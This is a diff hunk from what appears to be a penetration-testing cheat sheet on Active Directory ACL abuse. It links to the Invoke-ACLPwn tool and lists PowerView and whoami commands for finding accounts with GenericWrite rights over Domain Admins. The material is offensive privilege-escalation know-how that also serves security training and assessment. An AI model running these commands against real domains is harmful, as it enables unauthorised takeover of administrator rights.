@@ -466,10 +466,13 @@ https://github.com/fox-it/Invoke-ACLPwn \
 https://raw.githubusercontent.com/fox-it/Invoke-ACLPwn/master/Invoke-ACLPwn.ps1 \
 ```
 Import-Module .\powerview.ps1
+Get-DomainGroup -AdminCount | select cn
 Get-ObjectAcl -SamAccountName <users> -ResolveGUIDS
 Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDS
 
 #GenericWrite on Domain Admins
+whoami /all  #Get SID
+#Search groups Admins
 Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDS | ? { ($_.ActiveDirectoryRights -match 'GenericWrite' ) -and ($_.SecurityIdentifier -match 'S-1-ID' ) }
 Get-ObjectAcl -SamAccountName * -ResolveGUIDS | ? { ($_.ActiveDirectoryRights -match 'GenericWrite' ) -and ($_.SecurityIdentifier -match 'S-1-ID' ) }
 Exploit 
